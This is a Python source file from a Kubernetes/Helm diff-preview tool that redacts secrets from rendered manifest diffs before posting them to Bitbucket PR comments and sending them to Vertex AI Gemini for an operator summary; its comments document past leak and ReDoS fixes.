# caught the real cost of that: test_redact_pass_abbreviation pins that a
# field literally named "redisPass" (no "password" substring at all) must
# still be redacted, and the same abbreviation shape plausibly exists for
# auth fields (serviceAuth, basicAuth) with no compound alternative that
# would catch them. Removing bare key/pass/auth without evidence each one
# is actually a live false positive would trade a proven leak-prevention
# behavior for a hypothetical cosmetic one -- not a trade this module
# makes. Only "key" had a concrete, audited false positive (tolerations
# `key:`, `topologyKey:` on acme-config-prod PR #3837): that one is fixed
# precisely, by name, below.
# Bare "key" is kept (it is the only way to catch an arbitrary custom field
# like sshKey/gpgKey that no explicit compound names), which means it still
# over-matches two Kubernetes API field names that are also bare "key":
# a toleration's `key:` (the taint key it tolerates) and a node/pod affinity
# matchExpressions item's `key:` (the label key being matched), plus the
# compound `topologyKey:` in topologySpreadConstraints. All three are fixed,
# structural PodSpec field names -- never used to hold a secret value --
# unlike `kind: Secret` data keys, which are arbitrary and still get
# whole-masked regardless of name by _redact_secret_section. Exempt them by
# exact name instead of narrowing the regex further, so the fix is precise
# and does not quietly reopen a real "*Key" secret field.
_SCHEDULING_FIELD_EXEMPT = frozenset({"key", "topologykey"})


def _is_scheduling_field(key_part: str) -> bool:
    """True if key_part (the 'name:' text captured before the value, e.g.
    'topologyKey: ' or '- key: ') names a structural Kubernetes scheduling
    field that must never be treated as sensitive, regardless of substring
    overlap with _SENSITIVE_KEYS. See _SCHEDULING_FIELD_EXEMPT above."""
    name = key_part.strip().lstrip("-").strip().rstrip(":=").strip().strip('"\'')
    return name.lower() in _SCHEDULING_FIELD_EXEMPT

# v2.5.21 (F1): hard cap on the helm-error text fed to _redact_error_detail's
# regex, applied BEFORE matching to kill the quadratic backtracking. Far above
# the caller's own [:400] so error diagnostics keep full context.
_REDACT_DETAIL_MAX_CHARS = 4000

def _is_block_scalar_opener(val: str) -> bool:
    """True if a YAML value is a block-scalar indicator (`|`, `>`), even with
    a chomping/indentation indicator or a trailing comment.

    The membership test this replaces (val in ("|", "|-", ...)) missed valid
    openers with a trailing comment, e.g. `tls.crt: |- # PEM cert`: YAML
    allows a comment after the indicator, so the value string was
    "|- # PEM cert", not "|-". The opener line got masked, but in_block was
    never entered, so the continuation lines (the real secret bytes) leaked
    verbatim -- the same leak class as FIX D / v2.5.0 H3 / v2.5.14, confirmed
    live. Grammar: [|>] then up to two of {digit 1-9, + , -} in any order,
    optional whitespace, optional # comment."""
    return bool(re.match(r'^[|>](?:[1-9]|[+-]){0,2}\s*(?:#.*)?$', val.strip()))


def _redact_secret_section(text: str) -> str:
    """Display-time redaction for `kind: Secret` diff sections.

    Inside a Secret, the key NAME is not a reliable sensitivity signal
    (ca.crt, connection-string, arbitrary app keys), so every `key: value`
    line is masked, keeping keys and diff markers so the reader still sees
    WHICH entries changed. Runs at display time only - the diff engine
    compares the real values, so changes are still detected.

    v2.5.14: a Secret data value rendered as a YAML block scalar (`key: |`,
    `|-`, `>`, ...) -- a common shape for multi-line secrets such as TLS
    certs, PEM keys, or a multi-line .env blob -- only had its OPENER line
    masked. The continuation lines (the actual secret bytes) matched neither
    `key: value` nor anything else this function checked, so they fell
    through to the `else` branch and were emitted verbatim. Confirmed live:
    a `tls.crt: |-` value with base64 content on the following indented
    lines leaked that content in full into the Bitbucket PR comment. Reuses
    the same in-block/dedent tracking already proven correct in
    _redact_k8s_env_pairs / _mask_block_line.
    """
    out = []
    in_block = False
    block_indent = 0
    for line in text.splitlines():
        if in_block:
            marker_len = 1 if line[:1] in "+- " else 0
            rest = line[marker_len:]
            content_indent = len(rest) - len(rest.lstrip())
            if line.strip() == "":
                out.append(line)
                continue
            if content_indent > block_indent:
                out.append(_mask_block_line(line))
                continue
            in_block = False  # dedented out of the block -> normal handling

        m = re.match(r'^([+\- ]*)([\w.\-/]+\s*[:=]\s*)(.+)$', line)
        if m and m.group(3).strip() not in ("{}", "[]", "Opaque"):
            val = m.group(3).strip()
            out.append(f"{m.group(1)}{m.group(2)}[REDACTED]")
            if _is_block_scalar_opener(val):
                # Block scalar opener (incl. a trailing comment): the value
                # itself is on the following indented lines, not on this line.
                # Enter block mode so those continuation lines get masked too
                # instead of leaking.
                marker_len = 1 if line[:1] in "+- " else 0
                rest = line[marker_len:]
                block_indent = len(rest) - len(rest.lstrip())
                in_block = True
        else:
            out.append(line)
    return "\n".join(out)


def _redact_k8s_env_pairs(text: str) -> str:
    """Redact the two-line Kubernetes env-var form.

    Rendered Deployment manifests express env vars as:
        - name: appspace_someSecretKey
          value: <the actual secret>
    The single-line redactors test the YAML key of each line, but here the
    secret sits on a line whose own key is literally `value` — which never
    matches _SENSITIVE_KEYS. So before v2.4.9 every such secret leaked in
    full into the PR comment regardless of the (sensitive) name above it
    (FIX D, the highest-severity finding of the July 2026 campaign).

    This pass handles three shapes of the k8s env-var pattern:
      1. two-line inline:  - name: X\n  value: <secret>
      2. two-line block:   - name: X\n  value: |\n    <secret lines...>
      3. flow mapping:     - {name: X, value: <secret>}
    In every case, if the NAME string matches _SENSITIVE_KEYS the value is
    masked. Diff markers, the name line, and the `value:` key are preserved.
    Block scalars (H3) and flow mappings (H4) were added in v2.5.0 after the
    v2.4.9 FIX D only covered the two-line inline shape.
    """
    lines = text.splitlines()
    # Capture the name token from a `- name: X` / `name: X` line.
    name_re  = re.compile(r'^[+\- ]*\s*-?\s*name\s*:\s*(.+?)\s*$')
    # Inline value, or a block-scalar opener (value: | / |- / > / >- ...).
    value_re = re.compile(r'^([+\- ]*)(\s*)value\s*:\s*(.*)$')
    # Flow mapping: - {name: X, value: Y}
    flow_re  = re.compile(r'^([+\- ]*\s*-?\s*\{)(.*)(\})\s*$')
    last_name_sensitive = False
    in_block = False          # inside a block-scalar value we are masking
    block_indent = 0          # column of the `value:` key that opened the block
    out = []
    for line in lines:
        # Continuation lines of a sensitive block scalar: mask until indentation
        # returns to or above the value-key column, or the line is empty.
        if in_block:
            # A unified-diff marker is at most ONE leading char (+/-/space).
            # Do NOT greedily eat a run of dashes — content like "-----BEGIN"
            # starts with dashes that are data, not diff markers (v2.5.0 H3).
            marker_len = 1 if line[:1] in "+- " else 0
            rest = line[marker_len:]
            content_indent = len(rest) - len(rest.lstrip())
            if line.strip() == "":
                out.append(line)
                continue
            if content_indent > block_indent:
                out.append(_mask_block_line(line))
                continue
            in_block = False  # dedented out of the block -> normal handling

        fm = flow_re.match(line)
        if fm:
            inner = fm.group(2)
            # find name: X and value: Y inside the flow mapping
            nmatch = re.search(r'name\s*:\s*([^,}\s]+)', inner)
            if nmatch and _SENSITIVE_KEYS.search(_unquote(nmatch.group(1))):
                inner2 = re.sub(r'(value\s*:\s*)([^,}]+)', r'\1[REDACTED]', inner)
                out.append(f"{fm.group(1)}{inner2}{fm.group(3)}")
            else:
                out.append(line)
            continue

        nm = name_re.match(line)
        if nm:
            last_name_sensitive = bool(_SENSITIVE_KEYS.search(_unquote(nm.group(1))))
            out.append(line)
            continue

        vm = value_re.match(line)
        if vm:
            marker, indent_ws, val = vm.group(1), vm.group(2), vm.group(3)
            key_col = len(marker) + len(indent_ws)
            if last_name_sensitive:
                if val.strip() == "" or _is_block_scalar_opener(val):
                    # Block scalar opener (incl. a trailing comment), or a bare
                    # `value:` whose content is on the next lines: keep the
                    # `value:` line, mask the body.
                    out.append(line)
                    in_block = True
                    block_indent = key_col
                else:
                    # Inline value: mask it. Both '-' old and '+' new lines hit
                    # here while last_name_sensitive stays True.
                    out.append(f"{marker}{indent_ws}value: [REDACTED]")
            else:
                out.append(line)
            continue

        # A non-name, non-value, non-continuation line ends this env-var block.
        if line.strip() != "":
            last_name_sensitive = False
        out.append(line)
    return "\n".join(out)


def _fence_safe(text: str) -> str:
    """Neutralize triple-backtick sequences so untrusted rendered content
    cannot break out of the ```diff code fence it is placed in.

    v2.5.19 (R4, community-research round): a value in a rendered manifest
    (e.g. a ConfigMap holding a Markdown MOTD) can contain ```, which closes
    the bot's own code fence and lets the rest of that value render as live
    Markdown in the PR comment — enough to inject a fake "Status: SUCCESS"
    line or hidden content that a reviewer reads as the bot's own words. We
    insert a zero-width space between the backticks: the fence sequence is
    broken (three separate spans, not a fence token) while the text still
    reads as ``` to a human. Applied to every body placed inside a fence.
    """
    return text.replace("```", "`\u200b`\u200b`")


def _show_cr(text: str) -> str:
    """Make carriage returns visible in a display diff.

    v2.5.19 (E3): a PR that only flips CRLF<->LF in a value file produces
    rendered -/+ pairs that look byte-identical (the \\r is invisible), which
    reads as a broken diff. Replace a trailing \\r with a visible symbol (␍,
    U+240D) so the real change is obvious. Only trailing \\r is touched; a
    bare \\r mid-line would be unusual in helm output and is left alone.
    """
    return text.replace("\r\n", "\u240d\n").replace("\r", "\u240d")


def _mask_block_line(line: str) -> str:
    """Replace the content of a block-scalar continuation line with a marker,
    preserving the diff marker and indentation for readability (v2.5.0 H3)."""
    # A unified-diff marker is at most one leading char; do not eat data dashes.
    marker_len = 1 if line[:1] in "+- " else 0
    prefix = line[:marker_len]
    rest = line[marker_len:]
    indent = len(rest) - len(rest.lstrip())
    return f"{prefix}{' ' * indent}[REDACTED]"


def _redact_for_display(hdr: str, body: str) -> str:
    """Redact a diff section before it is posted to Bitbucket.

    v1 Secret sections get whole-value masking; everything else gets the
    same key-name based redaction the AI prompt has always had, PLUS the
    two-line k8s env-var pass (FIX D). Before v2.4.3 only the AI path
    redacted - the Bitbucket comment published rendered manifests verbatim,
    including Secret data blocks. Kinds merely containing "Secret"
    (ExternalSecret, SealedSecret) hold references, not values, and are NOT
    whole-masked.
    """
    if re.search(r"/Secret[\s/]", hdr + " "):
        return _redact_secret_section(body)
    return _redact_k8s_env_pairs(_redact_sensitive(body))


def _redact_error_detail(detail: str) -> str:
    """Redact secret-looking values from a helm/render error before it can
    reach a PR comment or a build status.

    v2.5.19 (R2, community-research round): helm's YAML errors echo the
    offending source line verbatim ("yaml: line 5: password: hunter2 ..."),
    so a parse failure on a value file leaked whatever was on that line into
    the comment — the same class as Argo CD CVE-2025-23216 (secrets shown in
    error messages and the diff view). This masks the value after any
    `<sensitive-key>:` or `<sensitive-key>=` token while keeping the key name
    and the surrounding message intact for diagnosis. Fail-safe: on any regex
    trouble, returns a generic string rather than risking the raw detail.

    v2.5.21 (F1, ReDoS): the caller truncated with [:400] AFTER this ran, so
    the regex saw the full untruncated helm stderr. The `[A-Za-z0-9_.\\-]*`
    prefix backtracks quadratically on a long dashed near-miss run
    (`aaa-aaa-...`) — content an attacker can put in a values file that helm
    then echoes. Measured 80KB -> 132s of CPU pinning a worker thread. The
    fix is to bound the input to a few KB BEFORE the regex: the caller only
    keeps [:400] anyway, and a much larger head still leaves ample context
    for masking. The bound makes the quadratic term a small constant.
    """
    if not detail:
        return detail
    # Bound BEFORE the regex — this is the actual ReDoS fix. Well above the
    # caller's own [:400] so diagnostics are unaffected.
    if len(detail) > _REDACT_DETAIL_MAX_CHARS:
        detail = detail[:_REDACT_DETAIL_MAX_CHARS]
    try:
        # key: value  and  key=value  where the key looks sensitive.
        def _mask(match):
            return f"{match.group(1)}{match.group(2)}[REDACTED]"
        pattern = re.compile(
            r'(?i)\b([A-Za-z0-9_.\-]*'
            r'(?:password|passwd|pwd|secret|token|key|auth|credential|bearer'
            r'|jwt|dsn|session|cookie|connection[-_]?string)'
            r'[A-Za-z0-9_.\-]*\s*[:=]\s*)(["\']?)\S.*',
        )
        return pattern.sub(_mask, detail)
    except Exception:
        return "(error detail withheld — could not be safely redacted)"


def _redact_sensitive(text: str) -> str:
    """Redact secret-like values from diff text before sending to Vertex AI.

    Matches lines where the key name looks sensitive (password, token, key,
    secret, etc.) and replaces the value with [REDACTED]. Operates on the
    rendered diff lines ('+'/'-' prefixed) so structural diff context is kept.

    Only the VALUE portion (after ':', '=', or quoted assignment) is redacted;
    key names and diff markers are preserved for context.

    A sensitive key whose value is a YAML block scalar (`private-key: |`) has
    its continuation lines masked too: matching only the opener line here left
    the indented body to leak on any non-Secret, non-env resource (e.g. a
    ConfigMap or CRD holding a PEM key or token), since neither this pass nor
    _redact_k8s_env_pairs covered that shape. Same block-tracking as the other
    two redactors.
    """
    # Idempotence guard (property-test finding, inputs like '0\r\r' or
    # '0\x85'): splitlines-plus-join drops trailing terminators one per
    # pass and normalizes exotic ones to \n, so content-bearing text
    # ending in ANY of splitlines' terminators changed on every pass.
    # Drop all trailing terminators up front: one stable fixed point,
    # same documented rule that a trailing newline is dropped.
    # Terminator-only input keeps its shrink-by-one behaviour, pinned by
    # test_terminator_only_input_shrinks_by_design.
    _terms = "\n\r\x0b\x0c\x1c\x1d\x1e\x85\u2028\u2029"
    if text.strip(_terms):
        text = text.rstrip(_terms)
    redacted_lines = []
    in_block = False
    block_indent = 0
    for line in text.splitlines():
        if in_block:
            marker_len = 1 if line[:1] in "+- " else 0
            rest = line[marker_len:]
            content_indent = len(rest) - len(rest.lstrip())
            if line.strip() == "":
                redacted_lines.append(line)
                continue
            if content_indent > block_indent:
                redacted_lines.append(_mask_block_line(line))
                continue
            in_block = False  # dedented out of the block -> normal handling
        # Match key: value or key=value patterns (YAML / env-style).
        m = re.match(r'^([+\- ]*)([\w.\-/]+\s*[:=]\s*)(.+)$', line)
        if (m and _SENSITIVE_KEYS.search(m.group(2))
                and not _is_scheduling_field(m.group(2))):
            redacted_lines.append(f"{m.group(1)}{m.group(2)}[REDACTED]")
            if _is_block_scalar_opener(m.group(3).strip()):
                marker_len = 1 if line[:1] in "+- " else 0
                rest = line[marker_len:]
                block_indent = len(rest) - len(rest.lstrip())
                in_block = True
        else:
            redacted_lines.append(line)
    return "\n".join(redacted_lines)


_APP_COMPONENT_SUFFIX = re.compile(r"-(ss|ms|glb)$")

def _envs_from_apps(apps) -> list:
    """Derive environment names deterministically from ArgoCD app names.

    Apps follow \'<env>-<component>\' (e.g. pv-qa88-a-ss -> pv-qa88-a).
    Unknown suffixes fall back to the app name itself, so a new component
    type degrades to a slightly verbose but always-true environment list.
    The AI model is never asked for environment names - before v2.4.2 it
    copied literal example values straight from the prompt template.
    """
    return sorted({_APP_COMPONENT_SUFFIX.sub("", a.split("/")[-1]) for a in apps})


def _precomputed_facts_note(results: dict) -> str:
    """Authoritative deterministic facts appended to the AI prompt (v2.5.26).
    Computed at diff time from the FULL un-truncated section list, so a
    deletion in a 111-resource app reaches the model even when its section
    never fits the capped DIFF DATA (the PR-6773 bug)."""
    deleted = [(app, h) for app, r in results.items()
               for h in (r.deleted_resources or [])]
    zeroed  = [(app, h) for app, r in results.items()
               for h in (r.replicas_zeroed or [])]
    if not deleted and not zeroed:
        return ""
    out = ["\n\nPRE-COMPUTED FACTS (authoritative, from the full un-truncated diff):"]
    if deleted:
        out.append("Resources DELETED entirely:")
        out += [f"- {app}: {h}" for app, h in deleted[:30]]
        if len(deleted) > 30:
            out.append(f"- (+{len(deleted)-30} more)")
    if zeroed:
        out.append("Workloads with replicas dropping to 0:")
        out += [f"- {app}: {h}" for app, h in zeroed[:30]]
    return "\n".join(out) + "\n"


def generate_ai_summary(app_results: dict) -> str | None:
    """Call Vertex AI Gemini to produce an operator-friendly diff summary.

    Input: already-parsed app_results {app: (diff_text, has_diff, error)}.
    Output: structured markdown string for operators, or None on any failure.

    Format returned (for consistent rendering in format_comment):
      LINE 1:  bold metrics line  e.g.  **2 app(s) updated · 6 resource(s) changed**
      BODY:    per-app bullet sections
      LAST:    critical flag line
    """
    if not AI_SUMMARY_ENABLED:
        # COPS-2555: disabled by operator request. Short-circuits before any
        # prompt building or Vertex AI call, not just before rendering, so
        # disabling this also removes its cost/latency, not only its output.
        print("      [AI] AI_SUMMARY_ENABLED=false — skipping AI call")
        return None
    try:
        results = {app: _result(v) for app, v in app_results.items()}
        # Use pre-parsed sections from DiffResult — never re-parse.
        changed = {
            app: r.sections
            for app, r in results.items()
            if r.outcome == OUT_DIFF
        }
        # Apps whose diff could not be computed (indeterminate) or errored.
        errors = {
            app: (r.error or r.reason)
            for app, r in results.items()
            if r.outcome in (OUT_INDETERMINATE, OUT_ERROR)
        }
        if not changed and not errors:
            print("      [AI] No changed apps — skipping AI call")
            return None
        print(f"      [AI] Preparing prompt: {len(changed)} changed app(s), "
              f"{sum(len(s) for s in changed.values())} section(s)")

        # FIX B2 (v2.5.1): the top summary line must use the REAL resource
        # count (DiffResult.n_res), not len(sections) which is truncated to
        # AI_MAX_SECTIONS_PER_APP=10 for the LLM prompt. v2.4.9 FIX B fixed
        # the per-app inline header but missed this deterministic top line,
        # which is prepended to the AI text verbatim (not LLM-generated) and
        # is exactly the number a reviewer reads first. Found during the
        # post-merge live verification round.
        total_resources = sum(
            results[app].n_res for app in changed if app in results
        )

        # v2.5.18 (S1): cap the number of apps in the prompt — see AI_MAX_APPS
        # above for the measured sizes that motivated this. Keep the apps with
        # the most changed resources (the ones a summary matters most for);
        # sorted() is stable, so ties keep the original dict order.
        prompt_apps = list(changed)
        omitted = 0
        if len(prompt_apps) > AI_MAX_APPS:
            prompt_apps = sorted(
                changed, key=lambda a: results[a].n_res, reverse=True)[:AI_MAX_APPS]
            omitted = len(changed) - AI_MAX_APPS
            with _diff_stats_lock:
                _diff_stats["ai_prompt_capped"] += 1
            print(f"      [AI] Prompt capped to {AI_MAX_APPS} of "
                  f"{len(changed)} changed apps ({omitted} omitted)")

        sections_parts = []
        for app in prompt_apps:
            sections = changed[app]
            sections_parts.append(f"### App: {app}")
            for header, body in sections[:AI_MAX_SECTIONS_PER_APP]:
                # v2.5.14: this used to call _redact_sensitive() directly,
                # which only masks a value when the KEY NAME matches
                # _SENSITIVE_KEYS. That is exactly the check
                # _redact_secret_section's own docstring says is unreliable
                # inside a Secret (ca.crt, tls.crt, ca.bundle, or any
                # custom-named data key do not contain "password/token/
                # secret/key/..."). The Bitbucket-comment path already
                # special-cases `kind: Secret` for whole-value masking via
                # _redact_for_display -- this prompt-building path never did,
                # so real Secret values with an unremarkable-looking key name
                # were sent to Vertex AI (an external API) in full. Confirmed
                # live: a Secret section with tls.crt/ca.bundle keys passed
                # through _redact_sensitive completely unredacted.
                # _redact_for_display is kind-aware (whole-masks Secret
                # bodies, including block scalars since the fix above) and
                # falls back to the same _redact_sensitive + env-pairs
                # redaction for every other kind, so no other section's
                # behavior changes.
                trimmed = _redact_for_display(header, body[:AI_MAX_BODY_CHARS])
                if len(body) > AI_MAX_BODY_CHARS:
                    trimmed += "\n... (truncated)"
                sections_parts.append(f"Resource: {header}\n{trimmed}")
        if omitted:
            # Tell the model the data is a size-capped sample, so it never
            # phrases the summary as if these were ALL the changes. The
            # deterministic headline (built in code below) covers all apps.
            sections_parts.append(
                f"### {omitted} more app(s) omitted from this prompt for size. "
                f"The headline counts cover ALL apps; treat the sections above "
                f"as a representative sample of the largest changes.")

        error_note = ""
        if errors:
            # FIX G (v2.4.9): make the indeterminate note explicit so the AI
            # summary never renders a misleading "No changes" for apps that
            # actually failed to diff. These are NOT confirmed unchanged and
            # their diff could not be computed.
            error_note = (
                "\n\nIMPORTANT: the following app(s) are NOT confirmed unchanged — "
                "their diff could not be computed and their state is UNKNOWN. "
                "Never describe them as having no changes; if there are no other "
                f"changed apps, say the diff could not be computed: {', '.join(errors.keys())}"
            )

        envs = _envs_from_apps(changed.keys())
        env_line = ("\U0001f30d **AFFECTED ENVIRONMENTS:** "
                    + ", ".join(f"`{e}`" for e in envs)
                    + f" ({len(envs)} total)")

        prompt = (
            "You are a Senior SRE reviewing a Kubernetes GitOps diff from a Helm-based platform.\n"
            f"Changeset: {len(changed)} app(s), {total_resources} resource section(s).\n\n"
            "ANALYSIS REQUIREMENTS:\n"
            "- Only analyse what is explicitly shown in DIFF DATA below.\n"
            "- Use ONLY service and resource names that literally appear in DIFF DATA. "
            "Never invent, guess, or copy names from these instructions.\n"
            "- Helm shows changes as '-' (old) and '+' (new) lines \u2014 this is normal for updates.\n"
            "- VERSION COMPARISON: only report a downgrade when the full version string actually "
            "decreases (e.g. 1.93.1 \u2192 1.93.0 is a downgrade; 1.93.1-rc1 \u2192 1.93.1-rc2 is NOT).\n"
            "- Skip annotation-only changes (argocd.argoproj.io/tracking-id, "
            "helm.sh/chart, kubectl.kubernetes.io/last-applied-configuration, checksum/).\n"
            "- For new Deployments/StatefulSets: say 'new service'. For removed ones: say 'removed'.\n\n"
            "Respond with EXACTLY the two sections below and nothing else. Replace every "
            "<angle-bracket> placeholder with real values taken from DIFF DATA:\n\n"
            "\U0001f4ca **SUMMARY:**\n"
            "   <one sentence overview of the change type>\n"
            "   Key service changes (max 8 entries, group similar ones with '+N more'):\n"
            "   - `<service>`: `<old-version>` \u2192 `<new-version>`\n"
            "   - `<service>`: new service added\n"
            "   - `<service>`: removed\n\n"
            "\u26a0\ufe0f **CRITICAL CHANGES:**\n"
            "   - Resources deleted entirely (the PRE-COMPUTED FACTS list below "
            "is authoritative and comes from the full un-truncated diff \u2014 "
            "if it lists deletions, they are ALWAYS critical; never say 'none')\n"
            "   - Version downgrades (full version string decreasing only)\n"
            "   - Replicas dropping to 0 (see PRE-COMPUTED FACTS)\n"
            "   - Services removed\n"
            "   - Liveness/readiness probes removed\n"
            "   If none of the above: `No critical changes detected`\n\n"
            "Rules: max 200 words total. Be terse \u2014 operators scan, they do not read.\n\n"
            "DIFF DATA:\n"
            + "\n".join(sections_parts)
            + _precomputed_facts_note(results)
            + error_note
        )

        token    = _gcp_access_token()
        endpoint = (
            f"https://{VERTEX_LOCATION}-aiplatform.googleapis.com/v1"
            f"/projects/{VERTEX_PROJECT}/locations/{VERTEX_LOCATION}"
            f"/publishers/google/models/{VERTEX_MODEL}:generateContent"
        )
        prompt_chars = len(prompt)
        print(f"      [AI] Calling {VERTEX_MODEL} | prompt={prompt_chars} chars | "
              f"maxTokens={2000}")
        _t0 = time.monotonic()
        resp = http(
            "POST",
            endpoint,
            headers={"Authorization": f"Bearer {token}"},
            body={
                "contents": [
                    {"role": "user", "parts": [{"text": prompt}]}
                ],
                "generationConfig": {
                    "maxOutputTokens": 2000,
                    "temperature": 0.1,
                    # Disable thinking tokens on flash models. Without this,
                    # the model spends ~1100 thinking tokens leaving almost
                    # nothing for output (finish=MAX_TOKENS). Pro models do
                    # not accept thinkingBudget 0, so only send it for flash.
                    **({"thinkingConfig": {"thinkingBudget": 0}}
                       if "flash" in VERTEX_MODEL else {}),
                },
            },
        )
        candidate = resp["candidates"][0]
        finish    = candidate.get("finishReason", "UNKNOWN")
        ai_text   = candidate["content"]["parts"][0]["text"].strip()
        elapsed   = round((time.monotonic() - _t0) * 1000)
        usage     = resp.get("usageMetadata", {})
        in_tok    = usage.get("promptTokenCount", "?")
        out_tok   = usage.get("candidatesTokenCount", "?")
        print(f"      [AI] Response OK | finish={finish} | "
              f"tokens in={in_tok} out={out_tok} | "
              f"output={len(ai_text)} chars | elapsed={elapsed}ms")
        if finish == "MAX_TOKENS":
            log("AI response truncated (MAX_TOKENS) — increase maxOutputTokens or shorten prompt",
                "WARNING")
        # The environments line is deterministic (built from app names in
        # code). Strip any such line the model may still emit, then prepend
        # the code-built header so facts never depend on the model.
        ai_text = "\n".join(
            l for l in ai_text.splitlines()
            if "AFFECTED ENVIRONMENT" not in l.upper()
        ).strip()
        head = (
            f"**{len(changed)} app(s) updated \u00b7 "
            f"{total_resources} resource(s) changed**\n\n"
            f"{env_line}\n\n"
        )
        return _normalize_ai_markdown(head + _sanitize_ai_summary(ai_text))
    except Exception as e:
        err_str = str(e)
        if "404" in err_str and "does not have access" in err_str:
            log("Vertex AI Model Garden not enabled. Accept Gemini terms: "
                "https://console.cloud.google.com/vertex-ai/model-garden?project=appspace-devops",
                "WARNING")
        else:
            log(f"[AI] Vertex AI call failed: {e}", "WARNING")
        return None

# ── Comment format ────────────────────────────────────────────────────
def _result(value):
    """Coerce an app_results value into a DiffResult.

    Accepts both DiffResult and the legacy (text, has_diff, error) tuple so the
    function stays usable from tests that pass plain tuples.
    """
    if isinstance(value, DiffResult):
        return value
    text, has_diff, error = value
    if has_diff:
        secs = parse_diff_sections(text) if text else []
        return DiffResult(text, secs, len(secs), True, None, OUT_DIFF, "changes")
    if error:
        return DiffResult("", [], 0, False, error, OUT_INDETERMINATE, "legacy")
    return DiffResult("", [], 0, False, None, OUT_NO_DIFF, "clean")


# Repeated-change rollup. Same census, second finding: on prod PR 3891
# the 384 sections that are NOT version noise collapse into 13 distinct
# changes, and two of them account for 364 sections (one KCC annotation
# added to every resource). One representative hunk plus a count is the
# whole review value; the other 363 copies are scroll.
_REPEAT_GROUP_MIN = 3


def _changed_lines_signature(body: str) -> str:
    """Only the added/removed lines. Context is deliberately ignored: two
    resources take "the same change" even when the surrounding manifest
    differs, which is exactly the KCC-annotation case."""
    return "\n".join(l for l in body.splitlines()
                      if l[:1] in "+-" and not l.startswith(("---", "+++")))


def _group_repeated_sections(sections: list, risk_headers=None):
    """(representatives, duplicates_by_header).

    Order of first occurrence is preserved, so the reordering that puts
    risk sections and needles first still decides what a reviewer reads
    first. Risk sections are never grouped: a deletion always gets its
    own hunk, however many identical siblings it has.
    """
    risky = set(risk_headers or ())
    groups, order = {}, []
    for hdr, body in sections:
        if hdr in risky:
            order.append((hdr, body, None))
            continue
        sig = _changed_lines_signature(body)
        if sig in groups:
            groups[sig].append(hdr)
            continue
        groups[sig] = []
        order.append((hdr, body, sig))
    reps, dups = [], {}
    for hdr, body, sig in order:
        reps.append((hdr, body))
        if sig is None:
            continue
        others = groups[sig]
        if len(others) + 1 >= _REPEAT_GROUP_MIN:
            dups[hdr] = others
        else:
            reps.extend((h, body) for h in others)
    return reps, dups


def _name_list(headers, room: int = 240):
    """As many resource names as fit in a readable line, then "...".

    Naming them matters: a reviewer scanning for one specific resource
    needs to see whether it is in the group. Naming ALL of them defeats
    the point of grouping in the first place.
    """
    names = []
    for h in headers:
        piece = f"`{h}`"
        if room - len(piece) - 2 < 0:
            break
        names.append(piece)
        room -= len(piece) + 2
    if not names:
        return ""
    return ", ".join(names) + (", ..." if len(names) < len(headers) else "")


def _full_hunks_link(artifact_url: str, app: str = "") -> str:
    """One phrase for "the complete diff lives over there".

    Every place the comment folds content away has to point somewhere,
    and a reviewer must never have to guess whether the missing hunks
    are lost or just elsewhere.

    app (COPS-2622): deep-link straight to that application's section on
    the page instead of to the top of it. Before this, every per-app
    pointer carried the identical bare URL -- 8 copies on a 6-app comment,
    ~42 on a fleet bump -- which on a comment phase E had just shrunk to a
    decision summary was most of what remained. The anchor shape comes
    from diff_ui.app_anchor and is NOT rebuilt here: two copies of that
    logic would drift and every deep link would 404 in silence.
    """
    if artifact_url:
        if app:
            return (f"[Full hunks for `{app}`]"
                    f"({artifact_url}#{diff_ui.app_anchor(app)})")
        return f"[Full hunks in the full diff view]({artifact_url})"
    return ("Full hunks are in the diff-preview full-diff view, linked "
            "from the build status.")


def _format_app_diff_block(app, sections, diff_text, show_diff=True, n_res=None,
                           risk_headers=None, version_fold=None,
                           artifact_url="", size_budget=None,
                           group_repeats=False, profile=None):
    """Return a list of markdown lines for one app's diff block.

    sections is DiffResult.sections — already truncated to display budget.
    n_res is the REAL total resource count (DiffResult.n_res); the header must
    report this, not len(sections), which is capped at AI_MAX_SECTIONS_PER_APP.
    Before v2.4.9 the header used len(sections), so an app that changed e.g.
    103 resources showed "10 resource(s) changed" and only 10 diffs, with no
    hint that 93 more changed silently (FIX B). show_diff=False outputs just
    the header line (large-mode table overflow).
    risk_headers (COPS-2567) is the set of deleted/zeroed headers for this app.
    When one of them is on display the sections are no longer a plain prefix,
    so the truncation note must not keep saying "first".
    Bitbucket does NOT render HTML <details>/<summary>, so we never use them.
    """
    profile = (profile or COMMENT_PROFILE).resolved()
    shown = len(sections) if sections else 0
    total = n_res if n_res is not None else shown
    n = total if total else 1
    out = [f"\u26a0\ufe0f **`{app}`** \u2014 {n} resource(s) changed", ""]
    if not show_diff:
        return out
    # profile.inline_diffs (COPS-2609): the mechanism phase E flips. Both
    # profiles keep it on today, so this branch is inert -- it exists so E
    # is a profile change rather than another surgery on this function.
    # What it must never do is drop the app: the header above still names
    # it and states how many resources changed, and the pointer says where
    # the hunks are. That is a relocation, not a loss.
    # Version-transition fold. Computed BEFORE the inline_diffs gate below,
    # because its summary line is a CONCLUSION, not evidence: "6 of 7
    # changed resources are the version transition 2602 -> 2603 only" is
    # exactly the sentence a reviewer needs to decide, and it contains no
    # YAML. Phase E moves the hunks to the page; dropping this line with
    # them would break umbrella rule 2 (never lose information) while
    # claiming to only relocate it.
    folded = set()
    _fold_lines = []
    if version_fold and version_fold.get("n_foldable"):
        folded = set(version_fold.get("headers") or ())
        _lbl = version_fold.get("label")
        _are = (f"are the version transition `{_lbl}` only"
                if _lbl else "are version-only updates")
        # Two short paragraphs inside the quote, never one long line: a
        # prose wall past ~350 chars wraps into something nobody reads
        # (measured on the last 50 merged prod comments, COPS-2605).
        # The link is appended here only when the hunks stay inline. With
        # phase E the block emits its own pointer immediately below, and
        # the same URL twice in adjacent lines reads like a rendering bug.
        _fold_link = (f" {_full_hunks_link(artifact_url, app=app)}"
                      if profile.inline_diffs else "")
        _fold_lines += [f"> \u2b06\ufe0f **{version_fold['n_foldable']} of "
                        f"{total} changed resource(s)** {_are}.{_fold_link}"]
        _what = ", ".join(version_fold.get("classes") or ())
        if _what:
            _fold_lines += [">", f"> Folded lines: {_what}."]
        # Name the needles. The fold line says "6 of 7 are version-only",
        # which leaves the reader knowing one resource changed for another
        # reason and not which one. With the hunks inline that was answered
        # by reading on; with phase E moving them to the page it would not
        # be answered at all, so the names come up into the comment. Names
        # are not evidence, and umbrella rule 2 is about information, not
        # about bytes.
        _needles = [h for h, _ in (sections or []) if h not in folded]
        if _needles and not profile.inline_diffs:
            _shown = ", ".join(f"`{_section_name(h)}`" for h in _needles[:5])
